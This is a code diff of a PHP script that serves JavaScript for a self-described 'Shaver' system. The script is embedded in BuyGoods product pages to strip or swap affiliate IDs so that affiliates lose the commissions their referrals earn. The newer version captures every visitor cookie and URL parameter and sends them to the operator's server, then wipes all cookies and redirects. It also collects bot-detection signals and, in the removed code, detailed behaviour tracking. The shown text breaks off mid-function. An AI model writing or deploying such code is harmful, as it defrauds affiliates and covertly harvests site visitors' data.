@@ -1,565 +1,492 @@
 <?php
 /**
- * Multi-Tenant Shaving Check Script
- *
- * Loaded by product pages via: <script src="https://bg.climaofficial.com/shaver/check.php?d=DOMAIN_KEY">
- *
- * This PHP file outputs JavaScript that:
- * 1. Contains active shaving sessions for the specified domain
- * 2. Checks if current page's aff_id should be shaved
- * 3. Removes/replaces URL parameters BEFORE BuyGoods tracking runs
- * 4. Injects the domain's BuyGoods tracking script with clean URL
- * 5. Tracks visits, clicks, and user behavior
+ * Shaver - Cookie-Poll-Clear-Redirect (v3)
+ * Loaded as: <script src="https://plan1.climaofficial.com/shaver/check.php?d=DOMAIN_KEY">
  */
-
 header('Content-Type: application/javascript; charset=utf-8');
 header('Access-Control-Allow-Origin: *');
 header('Cache-Control: no-cache, no-store, must-revalidate');
 header('Pragma: no-cache');
 header('Expires: 0');
 
-// Database configuration
 require_once __DIR__ . '/config.php';
 
 $domainKey = $_GET['d'] ?? '';
-$sessions = [];
-$domain = null;
-
 if (empty($domainKey)) {
-    echo "console.warn('[Shaver] No domain key provided in check.php?d=KEY');";
+    echo "console.warn('[Shaver] No domain key provided. Usage: check.php?d=DOMAIN_KEY');";
     exit;
 }
 
 try {
     $pdo = getDB();
-
-    // Get domain config
     $stmt = $pdo->prepare("SELECT * FROM domains WHERE domain_key = ? AND status = 'active'");
     $stmt->execute([$domainKey]);
     $domain = $stmt->fetch();
-
     if (!$domain) {
         echo "console.warn('[Shaver] Domain not found or inactive: " . addslashes($domainKey) . "');";
         exit;
     }
-
-    // Get active sessions for this domain
     $stmt = $pdo->prepare("SELECT id, aff_id, sub_id, mode, replace_aff_id, replace_sub_id FROM shaving_sessions WHERE domain_id = ? AND active = 1");
     $stmt->execute([$domain['id']]);
     $sessions = $stmt->fetchAll();
 } catch (PDOException $e) {
-    echo "console.error('[Shaver] Database error');";
+    echo "console.error('[Shaver] DB error: " . addslashes($e->getMessage()) . "');";
     exit;
 }
 
-// Prepare data for JavaScript
-$domainId = (int)$domain['id'];
+$domainId       = (int)$domain['id'];
+$bgAccountId    = addslashes($domain['bg_account_id'] ?? '');
+$bgProductCodes = addslashes($domain['bg_product_codes'] ?? '');
+$bgConvToken    = addslashes($domain['bg_conversion_token'] ?? '');
+
 $sessionsJson = json_encode(array_map(function($s) {
     return [
-        'id' => $s['id'],
-        'affId' => $s['aff_id'],
-        'subId' => $s['sub_id'] ?? '',
-        'replaceMode' => ($s['mode'] === 'replace'),
+        'id'           => $s['id'],
+        'affId'        => $s['aff_id'],
+        'subId'        => $s['sub_id'] ?? '',
+        'replaceMode'  => ($s['mode'] === 'replace'),
         'replaceAffId' => $s['replace_aff_id'] ?? '',
-        'replaceSubId' => $s['replace_sub_id'] ?? ''
+        'replaceSubId' => $s['replace_sub_id'] ?? '',
     ];
 }, $sessions));
 
-$bgAccountId = addslashes($domain['bg_account_id'] ?? '');
-$bgProductCodes = addslashes($domain['bg_product_codes'] ?? '');
-$bgConversionToken = addslashes($domain['bg_conversion_token'] ?? '');
-
-// Build API URL
-$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
-$host = $_SERVER['HTTP_HOST'];
-$path = dirname($_SERVER['SCRIPT_NAME']);
-$apiUrl = $protocol . '://' . $host . $path . '/api.php';
+$proto  = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
+$apiUrl = $proto . '://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['SCRIPT_NAME']) . '/api.php';
 ?>
-/**
- * Multi-Tenant Shaver - check.php
- * Domain: <?php echo addslashes($domain['label']); ?> (<?php echo addslashes($domain['domain_url']); ?>)
- * Generated: <?php echo date('Y-m-d H:i:s'); ?>
+(function () {
+'use strict';
 
- * Active Sessions: <?php echo count($sessions); ?>
+if (window.__shavingLoaded) return;
+window.__shavingLoaded = true;
 
- */
-(function() {
-    'use strict';
+/* ── CONFIG ── */
+var DOMAIN_ID   = <?php echo $domainId; ?>;
+var DOMAIN_KEY  = '<?php echo addslashes($domainKey); ?>';
+var API_URL     = '<?php echo $apiUrl; ?>';
+var BG_ACCOUNT  = '<?php echo $bgAccountId; ?>';
+var BG_PRODUCTS = '<?php echo $bgProductCodes; ?>';
+var BG_TOKEN    = '<?php echo $bgConvToken; ?>';
+var SESSIONS    = <?php echo $sessionsJson; ?>;
 
-    var DOMAIN_ID = <?php echo $domainId; ?>;
-    var DOMAIN_KEY = '<?php echo addslashes($domainKey); ?>';
-    var sessions = <?php echo $sessionsJson; ?>;
-    var API_URL = '<?php echo $apiUrl; ?>';
-    var BG_ACCOUNT_ID = '<?php echo $bgAccountId; ?>';
-    var BG_PRODUCT_CODES = '<?php echo $bgProductCodes; ?>';
-    var BG_CONVERSION_TOKEN = '<?php echo $bgConversionToken; ?>';
+var POLL_MS     = 500;
+var STABLE_SECS = 3;
+var MAX_WAIT_MS = 15000;
+var SHAVER_FLAG = '_shaver_cleaned';
 
-    console.log('[Shaver] Loaded', sessions.length, 'active sessions for domain:', DOMAIN_KEY);
+console.log('[Shaver] Loaded', SESSIONS.length, 'sessions for', DOMAIN_KEY);
 
-    // ============================================================
-    // URL PARAMETER PARSING
-    // ============================================================
-    function getUrlParams() {
-        var params = {};
-        var search = window.location.search.substring(1);
-        if (!search) return params;
-        var pairs = search.split('&');
-        for (var i = 0; i < pairs.length; i++) {
-            var pair = pairs[i].split('=');
-            var key = decodeURIComponent(pair[0]);
-            var value = pair[1] ? decodeURIComponent(pair[1]) : '';
-            params[key] = value;
-        }
-        return params;
+/* ── HELPERS ── */
+function ReadCookie(name) {
+    var n = name + '=', parts = document.cookie.split(/;\s*/);
+    for (var i = 0; i < parts.length; i++) {
+        if (parts[i].indexOf(n) === 0) return parts[i].substring(n.length);
     }
+    return '';
+}
+window.ReadCookie = ReadCookie;
 
-    // ============================================================
-    // SESSION MATCHING
-    // ============================================================
-    function findSession(affId, subId) {
-        for (var i = 0; i < sessions.length; i++) {
-            var s = sessions[i];
-            if (s.affId === affId) {
-                if (s.subId && s.subId !== subId) continue;
-                return s;
-            }
-        }
-        return null;
-    }
+function ss(k, v)  { try { v === null ? sessionStorage.removeItem(k) : sessionStorage.setItem(k, String(v)); } catch(e){} }
+function sg(k)     { try { return sessionStorage.getItem(k); } catch(e){ return null; } }
 
-    // ============================================================
-    // URL MODIFICATION
-    // ============================================================
-    function modifyUrl(session) {
-        var url = new URL(window.location.href);
-        if (session.replaceMode) {
-            url.searchParams.set('aff_id', session.replaceAffId);
-            if (session.replaceSubId) {
-                url.searchParams.set('subid', session.replaceSubId);
-            } else {
-                url.searchParams.delete('subid');
-            }
-            console.log('[Shaver] Replacing aff_id with:', session.replaceAffId);
-        } else {
-            url.searchParams.delete('aff_id');
-            url.searchParams.delete('affid');
-            url.searchParams.delete('subid');
-            url.searchParams.delete('sub_id');
-            console.log('[Shaver] Removing affiliate parameters');
-        }
-        window.history.replaceState({}, '', url.toString());
-    }
+function getParams() {
+    var p = {}, s = window.location.search.slice(1);
+    if (!s) return p;
+    s.split('&').forEach(function(pair) {
+        var kv = pair.split('=');
+        p[decodeURIComponent(kv[0])] = kv[1] ? decodeURIComponent(kv[1].replace(/\+/g,' ')) : '';
+    });
+    return p;
+}
 
-    // ============================================================
-    // TRACKING FUNCTIONS
-    // ============================================================
-    function trackVisit(session, affId, subId) {
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', API_URL, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify({
-            action: 'track_visit',
-            session_id: session.id,
-            domain_id: DOMAIN_ID,
-            aff_id: affId,
-            sub_id: subId,
-            page: window.location.href,
-            referrer: document.referrer || 'direct'
-        }));
-    }
+function isUpsellPage() {
+    return /\/(upsell|thankyou|thank-you|thank_you|confirmation|order-confirmation)/i.test(window.location.pathname);
+}
 
-    function logTraffic(affId, subId, wasShaved, shavingSessionId, source) {
-        if (!affId) return;
-        var trafficSource = source || document.referrer || 'direct';
+function xhrPost(action, data) {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', API_URL, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify(Object.assign({ action: action, domain_id: DOMAIN_ID }, data || {})));
+    return xhr;
+}
 
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', API_URL, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState === 4 && xhr.status === 200) {
-                try {
-                    var result = JSON.parse(xhr.responseText);
-                    if (result.success && result.traffic_id && window.__behaviorTracking) {
-                        window.__behaviorTracking.trafficId = result.traffic_id;
-                        // Process queued events
-                        if (window.__behaviorTracking.eventQueue.length > 0) {
-                            window.__behaviorTracking.eventQueue.forEach(function(event) {
-                                logBehaviorEvent(event.eventType, event.eventData);
-                            });
-                            window.__behaviorTracking.eventQueue = [];
-                        }
-                    }
-                } catch (e) {}
-            }
-        };
-        xhr.send(JSON.stringify({
-            action: 'log_traffic',
-            domain_id: DOMAIN_ID,
-            aff_id: affId,
-            sub_id: subId,
-            page_url: window.location.href,
-            referrer: trafficSource,
-            user_agent: navigator.userAgent,
-            was_shaved: wasShaved,
-            shaving_session_id: shavingSessionId,
-            session_uuid: window.__behaviorTracking ? window.__behaviorTracking.sessionUUID : null,
-            screen_width: window.screen.width,
-            screen_height: window.screen.height,
-            viewport_width: window.innerWidth,
-            viewport_height: window.innerHeight
-        }));
-    }
-
-    function trackClick(session, affId, subId) {
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', API_URL, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify({
-            action: 'track_click',
-            session_id: session.id,
-            domain_id: DOMAIN_ID,
-            aff_id: affId,
-            sub_id: subId,
-            page: window.location.href
-        }));
-    }
-
-    // ============================================================
-    // BEHAVIOR TRACKING SYSTEM
-    // ============================================================
-    function getSessionUUID() {
-        var uuid = null;
-        try { uuid = sessionStorage.getItem('_behavior_session_id'); } catch (e) {}
-        if (!uuid) {
-            uuid = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-            try { sessionStorage.setItem('_behavior_session_id', uuid); } catch (e) {}
-        }
-        return uuid;
-    }
-
-    window.__behaviorTracking = {
-        sessionUUID: getSessionUUID(),
-        trafficId: null,
-        landedAt: Date.now(),
-        maxScrollDepth: 0,
-        clickCount: 0,
-        hasReachedCheckout: false,
-        eventQueue: [],
-        isTabVisible: true,
-        lastScrollTime: 0,
-        firstClickTime: null,
-        checkoutTime: null,
-        checkoutUrl: null,
-        pageLoadTime: window.performance ? (window.performance.timing.loadEventEnd - window.performance.timing.navigationStart) : null
-    };
-
-    function logBehaviorEvent(eventType, eventData) {
-        if (!window.__behaviorTracking.trafficId) {
-            window.__behaviorTracking.eventQueue.push({ eventType: eventType, eventData: eventData, timestamp: Date.now() });
-            return;
-        }
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', API_URL, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify({
-            action: 'log_behavior_event',
-            domain_id: DOMAIN_ID,
-            traffic_id: window.__behaviorTracking.trafficId,
-            session_uuid: window.__behaviorTracking.sessionUUID,
-            event_type: eventType,
-            event_data: eventData,
-            timestamp: new Date().toISOString()
-        }));
-    }
-
-    function updateSessionMetrics() {
-        if (!window.__behaviorTracking.trafficId) return;
-        var sessionDuration = Math.floor((Date.now() - window.__behaviorTracking.landedAt) / 1000);
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', API_URL, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify({
-            action: 'update_session_metrics',
-            traffic_id: window.__behaviorTracking.trafficId,
-            session_duration: sessionDuration,
-            max_scroll_depth: window.__behaviorTracking.maxScrollDepth,
-            total_clicks: window.__behaviorTracking.clickCount,
-            reached_checkout: window.__behaviorTracking.hasReachedCheckout ? 1 : 0,
-            checkout_url: window.__behaviorTracking.checkoutUrl || null,
-            time_to_first_click: window.__behaviorTracking.firstClickTime ?
-                Math.floor((window.__behaviorTracking.firstClickTime - window.__behaviorTracking.landedAt) / 1000) : null,
-            time_to_checkout: window.__behaviorTracking.checkoutTime ?
-                Math.floor((window.__behaviorTracking.checkoutTime - window.__behaviorTracking.landedAt) / 1000) : null,
-            screen_width: window.screen.width,
-            screen_height: window.screen.height,
-            viewport_width: window.innerWidth,
-            viewport_height: window.innerHeight,
-            page_load_time: window.__behaviorTracking.pageLoadTime,
-            bounce: window.__behaviorTracking.clickCount === 0 ? 1 : 0
-        }));
-    }
-
-    // Scroll tracking
-    function setupScrollTracking() {
-        var scrollTimeout;
-        var lastDepth = 0;
-        window.addEventListener('scroll', function() {
-            clearTimeout(scrollTimeout);
-            scrollTimeout = setTimeout(function() {
-                var scrollY = window.scrollY || window.pageYOffset;
-                var docHeight = document.documentElement.scrollHeight;
-                var viewportHeight = window.innerHeight;
-                var scrollDepth = Math.min(100, Math.floor(((scrollY + viewportHeight) / docHeight) * 100));
-                if (scrollDepth > window.__behaviorTracking.maxScrollDepth) {
-                    window.__behaviorTracking.maxScrollDepth = scrollDepth;
-                    if (scrollDepth >= 25 && lastDepth < 25) logBehaviorEvent('scroll', {scrollDepth: 25, milestone: true});
-                    else if (scrollDepth >= 50 && lastDepth < 50) logBehaviorEvent('scroll', {scrollDepth: 50, milestone: true});
-                    else if (scrollDepth >= 75 && lastDepth < 75) logBehaviorEvent('scroll', {scrollDepth: 75, milestone: true});
-                    else if (scrollDepth >= 90 && lastDepth < 90) logBehaviorEvent('scroll', {scrollDepth: 90, milestone: true});
-                    lastDepth = scrollDepth;
-                }
-            }, 300);
-        });
-    }
-
-    // Click tracking
-    function setupDetailedClickTracking() {
-        document.addEventListener('click', function(e) {
-            var target = e.target;
-            while (target && target !== document.body) {
-                if (target.tagName === 'A' || target.tagName === 'BUTTON' ||
-                    (target.classList && (target.classList.contains('cp-btn') || target.classList.contains('mt-buy-now-btn')))) {
-                    window.__behaviorTracking.clickCount++;
-                    if (!window.__behaviorTracking.firstClickTime) window.__behaviorTracking.firstClickTime = Date.now();
-                    var buttonText = target.textContent ? target.textContent.trim() : '';
-                    logBehaviorEvent('click', {
-                        buttonText: buttonText.substring(0, 100),
-                        buttonId: target.id || '',
-                        targetUrl: (target.href || '').substring(0, 200),
-                        clickX: e.clientX, clickY: e.clientY,
-                        scrollDepthAtClick: window.__behaviorTracking.maxScrollDepth,
-                        timeFromLanding: Math.floor((Date.now() - window.__behaviorTracking.landedAt) / 1000)
-                    });
-                    break;
-                }
-                target = target.parentElement;
-            }
-        });
-    }
-
-    // Hover tracking on buy buttons
-    function setupHoverTracking() {
-        var hoverStartTime = null;
-        var hoveredButton = null;
-        document.addEventListener('mouseover', function(e) {
-            var target = e.target;
-            while (target && target !== document.body) {
-                if (target.classList && (target.classList.contains('cp-btn') || target.classList.contains('mt-buy-now-btn'))) {
-                    hoverStartTime = Date.now();
-                    hoveredButton = target;
-                    break;
-                }
-                target = target.parentElement;
-            }
-        });
-        document.addEventListener('mouseout', function(e) {
-            if (hoveredButton && hoverStartTime) {
-                var duration = Date.now() - hoverStartTime;
-                if (duration > 500) {
-                    logBehaviorEvent('hover', { element: 'buy-btn', buttonText: (hoveredButton.textContent || '').trim().substring(0, 100), duration: duration });
-                }
-                hoverStartTime = null;
-                hoveredButton = null;
-            }
-        });
-    }
-
-    // Checkout detection
-    function setupCheckoutDetection() {
-        var originalPushState = history.pushState;
-        if (originalPushState) {
-            history.pushState = function() {
-                if (arguments[2]) checkIfCheckoutReached(arguments[2]);
-                return originalPushState.apply(history, arguments);
-            };
-        }
-        window.addEventListener('popstate', function() { checkIfCheckoutReached(window.location.href); });
-
-        document.addEventListener('click', function(e) {
-            var target = e.target;
-            while (target && target !== document.body) {
-                if (target.href && target.href.indexOf('buygoods.com') !== -1) {
-                    if (!window.__behaviorTracking.hasReachedCheckout) {
-                        window.__behaviorTracking.hasReachedCheckout = true;
-                        window.__behaviorTracking.checkoutUrl = target.href;
-                        window.__behaviorTracking.checkoutTime = Date.now();
-                        logBehaviorEvent('checkout_reached', {
-                            checkoutUrl: target.href.substring(0, 200),
-                            timeToCheckout: Math.floor((Date.now() - window.__behaviorTracking.landedAt) / 1000),
-                            scrollDepthAtCheckout: window.__behaviorTracking.maxScrollDepth,
-                            clicksBeforeCheckout: window.__behaviorTracking.clickCount
-                        });
-                    }
-                    break;
-                }
-                target = target.parentElement;
-            }
-        });
-    }
-
-    function checkIfCheckoutReached(url) {
-        if (url && url.indexOf('buygoods.com') !== -1 && !window.__behaviorTracking.hasReachedCheckout) {
-            window.__behaviorTracking.hasReachedCheckout = true;
-            window.__behaviorTracking.checkoutUrl = url;
-            window.__behaviorTracking.checkoutTime = Date.now();
-            logBehaviorEvent('checkout_reached', { checkoutUrl: url.substring(0, 200), timeToCheckout: Math.floor((Date.now() - window.__behaviorTracking.landedAt) / 1000) });
+/* ── SESSION MATCH ── */
+function findSession(affId, subId) {
+    for (var i = 0; i < SESSIONS.length; i++) {
+        var s = SESSIONS[i];
+        if (s.affId === affId) {
+            if (s.subId && s.subId !== subId) continue;
+            return s;
         }
     }
+    return null;
+}
 
-    // Tab visibility tracking
-    function setupTabVisibilityTracking() {
-        var visibleStart = Date.now();
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                logBehaviorEvent('tab_hidden', { hidden: true, visibleDuration: Date.now() - visibleStart });
-                window.__behaviorTracking.isTabVisible = false;
-            } else {
-                logBehaviorEvent('tab_visible', { hidden: false });
-                window.__behaviorTracking.isTabVisible = true;
-                visibleStart = Date.now();
-            }
-        });
+/* ── BOT DETECTION ── */
+function getBotFlags() {
+    var f = [];
+    if (navigator.webdriver === true) f.push('webdriver');
+    if (navigator.plugins.length === 0) f.push('no_plugins');
+    if (!navigator.languages || !navigator.languages.length) f.push('no_languages');
+    if (/Chrome/.test(navigator.userAgent) && !window.chrome) f.push('missing_chrome');
+    if (/HeadlessChrome/.test(navigator.userAgent)) f.push('headless_chrome');
+    if (window.callPhantom || window._phantom) f.push('phantomjs');
+    return f;
+}
+
+/* ── BUYGOODS TRACKING ── */
+function injectBGTracking() {
+    if (!BG_ACCOUNT || !BG_PRODUCTS) return;
+    var src = 'https://tracking.buygoods.com/track/?a=' + BG_ACCOUNT
+        + '&firstcookie=0&tracking_redirect='
+        + '&referrer=' + encodeURIComponent(document.referrer)
+        + '&sessid2=' + ReadCookie('sessid2')
+        + '&product=' + BG_PRODUCTS
+        + '&vid1=&vid2=&vid3='
+        + '&caller_url=' + encodeURIComponent(window.location.href);
+    var el = document.createElement('script');
+    el.type = 'text/javascript'; el.defer = true; el.src = src;
+    document.head.appendChild(el);
+    console.log('[Shaver] BG tracking injected');
+}
+
+function injectConversionIframe() {
+    if (!BG_ACCOUNT || !BG_TOKEN) return;
+    setTimeout(function () {
+        var f = document.createElement('iframe');
+        f.async = true; f.style.display = 'none';
+        f.src = 'https://buygoods.com/affiliates/go/conversion/iframe/bg?a=' + BG_ACCOUNT + '&t=' + BG_TOKEN + '&s=' + ReadCookie('sessid2');
+        document.body.appendChild(f);
+    }, 1000);
+}
+
+/* ── SESSID2 LINK WATCHER ── */
+function ensureSessid2OnLinks() {
+    var sid = ReadCookie('sessid2') || new URLSearchParams(window.location.search).get('sessid2') || '';
+    if (!sid) return;
+    document.querySelectorAll('a[href*="buygoods.com"]').forEach(function(a) {
+        try { var u = new URL(a.href); u.searchParams.set('sessid2', sid); a.href = u.toString(); } catch(e){}
+    });
+}
+
+function startSessid2Watcher() {
+    [300, 1500, 3000].forEach(function(ms) { setTimeout(ensureSessid2OnLinks, ms); });
+    if (window.MutationObserver) {
+        var obs = new MutationObserver(ensureSessid2OnLinks);
+        obs.observe(document.body, { childList: true, subtree: true });
+        setTimeout(function() { obs.disconnect(); }, 10000);
     }
-
-    // Before unload
-    function setupBeforeUnload() {
-        window.addEventListener('beforeunload', function() {
-            updateSessionMetrics();
-            if (navigator.sendBeacon && window.__behaviorTracking.trafficId) {
-                navigator.sendBeacon(API_URL, JSON.stringify({
-                    action: 'update_session_metrics',
-                    traffic_id: window.__behaviorTracking.trafficId,
-                    session_duration: Math.floor((Date.now() - window.__behaviorTracking.landedAt) / 1000),
-                    max_scroll_depth: window.__behaviorTracking.maxScrollDepth,
-                    total_clicks: window.__behaviorTracking.clickCount,
-                    reached_checkout: window.__behaviorTracking.hasReachedCheckout ? 1 : 0
-                }));
-            }
-        });
-    }
-
-    // Periodic metric updates
-    setInterval(updateSessionMetrics, 30000);
-
-    // Initialize behavior tracking
-    function initBehaviorTracking() {
-        setupScrollTracking();
-        setupDetailedClickTracking();
-        setupHoverTracking();
-        setupCheckoutDetection();
-        setupTabVisibilityTracking();
-        setupBeforeUnload();
-    }
-
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', initBehaviorTracking);
-    } else {
-        initBehaviorTracking();
-    }
-
-    // ============================================================
-    // MAIN LOGIC
-    // ============================================================
-    var params = getUrlParams();
-    var affId = params.aff_id || params.affid || '';
-    var subId = params.subid || params.sub_id || '';
-    var utmSource = params.utm_source || params.source || params.ref || '';
-
-    if (affId) {
-        var session = findSession(affId, subId);
-        if (session) {
-            console.log('[Shaver] MATCH - aff_id:', affId, 'will be', session.replaceMode ? 'REPLACED' : 'REMOVED');
-            logTraffic(affId, subId, true, session.id, utmSource);
-            modifyUrl(session);
-            trackVisit(session, affId, subId);
-            window.__shavingSession = session;
-            window.__shavingOriginalAffId = affId;
-            window.__shavingOriginalSubId = subId;
-        } else {
-            console.log('[Shaver] No match for aff_id:', affId);
-            logTraffic(affId, subId, false, null, utmSource);
+    document.addEventListener('click', function(e) {
+        var t = e.target;
+        while (t && t !== document.body) {
+            if (t.href && t.href.indexOf('buygoods.com') !== -1) { ensureSessid2OnLinks(); break; }
+            t = t.parentElement;
         }
-    }
+    });
+}
 
-    window.__shavingLoaded = true;
-
-    // ============================================================
-    // INJECT BUYGOODS TRACKING SCRIPT
-    // ============================================================
-    function ReadCookie(name) {
-        name += '=';
-        var parts = document.cookie.split(/;\s*/);
-        for (var i = 0; i < parts.length; i++) {
-            var part = parts[i];
-            if (part.indexOf(name) === 0) return part.substring(name.length);
-        }
-        return '';
-    }
-    window.ReadCookie = ReadCookie;
-
-    if (BG_ACCOUNT_ID && BG_PRODUCT_CODES) {
-        var bgSrc = "https://tracking.buygoods.com/track/?a=" + BG_ACCOUNT_ID
-            + "&firstcookie=0&tracking_redirect=&referrer=" + encodeURIComponent(document.referrer)
-            + "&sessid2=" + ReadCookie('sessid2')
-            + "&product=" + BG_PRODUCT_CODES
-            + "&vid1=&vid2=&vid3=&caller_url=" + encodeURIComponent(window.location.href);
-
-        var bgScript = document.createElement('script');
-        bgScript.type = 'text/javascript';
-        bgScript.defer = true;
-        bgScript.src = bgSrc;
-        document.head.appendChild(bgScript);
-        console.log('[Shaver] BuyGoods tracking injected with clean URL');
-    }
-
-    // Conversion iframe
-    function injectConversionIframe() {
-        if (!BG_ACCOUNT_ID || !BG_CONVERSION_TOKEN) return;
-        setTimeout(function() {
-            var i = document.createElement("iframe");
-            i.async = true;
-            i.style.display = "none";
-            i.setAttribute("src", "https://buygoods.com/affiliates/go/conversion/iframe/bg?a=" + BG_ACCOUNT_ID + "&t=" + BG_CONVERSION_TOKEN + "&s=" + ReadCookie('sessid2'));
-            document.body.appendChild(i);
-        }, 1000);
-    }
-
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', injectConversionIframe);
-    } else {
-        injectConversionIframe();
-    }
-
-    // ============================================================
-    // CLICK TRACKING ON BUY BUTTONS
-    // ============================================================
-    function setupClickHandlers() {
-        if (!window.__shavingSession) return;
-        var session = window.__shavingSession;
-        var affId = window.__shavingOriginalAffId;
-        var subId = window.__shavingOriginalSubId;
-
-        var buttons = document.querySelectorAll('.cp-btn, .mt-buy-now-btn, a[href*="buygoods.com"]');
-        buttons.forEach(function(button) {
-            button.addEventListener('click', function() {
-                trackClick(session, affId, subId);
+/* ── COOKIE CLEAR ── */
+function clearAllCookies() {
+    var host = window.location.hostname;
+    var parts = host.split('.');
+    var domains = ['', host, '.' + host];
+    for (var i = 1; i < parts.length; i++) { domains.push('.' + parts.slice(i).join('.')); }
+    var paths = ['/', window.location.pathname, ''];
+    var survived = [];
+    document.cookie.split(';').map(function(c) { return c.trim().split('=')[0]; }).filter(Boolean).forEach(function(name) {
+        var cleared = false;
+        domains.forEach(function(d) {
+            paths.forEach(function(p) {
+                var str = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=' + (p||'/');
+                if (d) str += '; domain=' + d;
+                document.cookie = str;
+                if (!ReadCookie(name)) cleared = true;
             });
         });
+        if (!cleared) survived.push(name);
+    });
+    if (survived.length) console.log('[Shaver] Cookies survived:', survived.join(', '));
+}
+
+/* ── COOKIE POLL ── */
+function waitForCookiesThenShave(session, affId, subId) {
+    var start = Date.now(), lastCount = -1, stableStart = null;
+    function check() {
+        var count = document.cookie.split(';').filter(function(c){ return c.trim(); }).length;
+        var now = Date.now();
+        if (count !== lastCount) { lastCount = count; stableStart = now; }
+        var stableMs = now - (stableStart || now);
+        if (stableMs >= STABLE_SECS * 1000 || now - start >= MAX_WAIT_MS) {
+            doShave(session, affId, subId);
+        } else {
+            setTimeout(check, POLL_MS);
+        }
+    }
+    setTimeout(check, POLL_MS);
+}
+
+/* ── SNAPSHOT HELPER ── */
+function getAllCookiesObj() {
+    var obj = {};
+    document.cookie.split(';').forEach(function(c) {
+        var kv = c.trim().split('=');
+        if (kv[0]) obj[kv[0]] = kv.slice(1).join('=');
+    });
+    return obj;
+}
+function getAllParams() {
+    var p = {};
+    try { new URLSearchParams(window.location.search).forEach(function(v,k){ p[k]=v; }); } catch(e){}
+    return p;
+}
+
+/* ── DO SHAVE ── */
+function doShave(session, affId, subId) {
+    /* Before snapshot */
+    xhrPost('log_shave_snapshot', {
+        phase: 'before', session_id: session.id,
+        aff_id: affId, sub_id: subId,
+        mode: session.replaceMode ? 'replace' : 'remove',
+        replace_aff_id: session.replaceAffId, replace_sub_id: session.replaceSubId,
+        url: window.location.href, sessid2: ReadCookie('sessid2'),
+        cookies: getAllCookiesObj(),
+        cookie_count: document.cookie.split(';').filter(function(c){ return c.trim(); }).length,
+        url_params: getAllParams()
+    });
+
+    /* Clear all cookies */
+    clearAllCookies();
+
+    /* Set loop prevention */
+    ss(SHAVER_FLAG, '1');
+
+    /* Build redirect URL */
+    var url = new URL(window.location.href);
+    if (session.replaceMode) {
+        url.searchParams.set('aff_id', session.replaceAffId);
+        if (session.replaceSubId) url.searchParams.set('subid', session.replaceSubId);
+        else url.searchParams.delete('subid');
+        console.log('[Shaver] REPLACE → aff_id:', session.replaceAffId);
+    } else {
+        ['aff_id','affid','subid','sub_id'].forEach(function(k){ url.searchParams.delete(k); });
+        console.log('[Shaver] REMOVE → clean URL');
     }
 
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', setupClickHandlers);
-    } else {
-        setupClickHandlers();
-    }
+    window.location.href = url.toString();
+}
+
+/* ── POST-REDIRECT FLOW ── */
+function handlePostRedirect() {
+    ss(SHAVER_FLAG, null);
+    console.log('[Shaver] Post-redirect clean visit');
+
+    setTimeout(function() {
+        xhrPost('log_shave_snapshot', {
+            phase: 'after',
+            aff_id: sg('_shaver_aff_id') || '',
+            sub_id: sg('_shaver_sub_id') || '',
+            url: window.location.href,
+            sessid2: ReadCookie('sessid2'),
+            cookie_count: document.cookie.split(';').filter(function(c){ return c.trim(); }).length
+        });
+    }, 5000);
+
+    injectBGTracking();
+    startSessid2Watcher();
+    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', injectConversionIframe);
+    else injectConversionIframe();
+}
+
+/* ── BEHAVIOR & TRAFFIC TRACKING ── */
+var _bt = {
+    sessionUUID: (function(){ var u=sg('_behavior_session_id'); if(!u){u='sess_'+Date.now()+'_'+Math.random().toString(36).substr(2,9); ss('_behavior_session_id',u);} return u; })(),
+    trafficId: null, landedAt: Date.now(),
+    maxScrollDepth: 0, clickCount: 0,
+    hasCheckout: false, checkoutUrl: null, checkoutTime: null,
+    firstClickTime: null, eventQueue: [],
+    pageLoadTime: window.performance ? (window.performance.timing.loadEventEnd - window.performance.timing.navigationStart) : null
+};
+window.__behaviorTracking = _bt;
+
+function logBehaviorEvent(type, data) {
+    if (!_bt.trafficId) { _bt.eventQueue.push({type:type,data:data}); return; }
+    xhrPost('log_behavior_event', { traffic_id:_bt.trafficId, session_uuid:_bt.sessionUUID, event_type:type, event_data:data, timestamp: new Date().toISOString() });
+}
+
+function logTraffic(affId, subId, wasShaved, sessionId) {
+    if (!affId) return;
+    var botFlags = getBotFlags();
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', API_URL, true);
+    xhr.setRequestHeader('Content-Type','application/json');
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4 && xhr.status === 200) {
+            try {
+                var r = JSON.parse(xhr.responseText);
+                if (r.success && r.traffic_id) {
+                    _bt.trafficId = r.traffic_id;
+                    _bt.eventQueue.forEach(function(ev){ logBehaviorEvent(ev.type, ev.data); });
+                    _bt.eventQueue = [];
+                }
+            } catch(e){}
+        }
+    };
+    xhr.send(JSON.stringify({ action:'log_traffic', domain_id:DOMAIN_ID, aff_id:affId, sub_id:subId,
+        page_url:window.location.href, referrer:document.referrer||'direct', user_agent:navigator.userAgent,
+        was_shaved:wasShaved?1:0, shaving_session_id:sessionId||null, session_uuid:_bt.sessionUUID,
+        screen_width:window.screen.width, screen_height:window.screen.height,
